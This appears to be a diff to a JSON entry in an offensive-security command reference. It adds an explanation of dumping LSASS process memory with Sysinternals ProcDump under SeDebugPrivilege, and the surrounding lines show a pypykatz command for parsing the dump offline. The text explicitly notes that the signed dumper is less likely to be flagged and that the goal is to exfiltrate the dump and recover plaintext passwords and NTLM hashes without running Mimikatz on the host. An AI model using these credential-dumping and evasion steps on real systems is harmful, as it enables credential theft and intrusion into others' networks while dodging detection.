@@ -125,5 +125,6 @@
       "label": "Exfil + parse offline (keeps mimikatz off the host)",
       "command": "pypykatz lsa minidump lsass.dmp"
     }
-  ]
+  ],
+  "explain": "Uses SeDebugPrivilege to dump LSASS with ProcDump, then parse offline:\n  procdump.exe             Sysinternals dumper (signed, less likely to be flagged)\n  -accepteula              auto-accept the EULA\n  -ma lsass.exe            full memory dump of the LSASS process\n  lsass.dmp                output file\nExfil and parse with pypykatz lsa minidump to recover plaintext passwords and NTLM hashes without running Mimikatz on the host."
 }
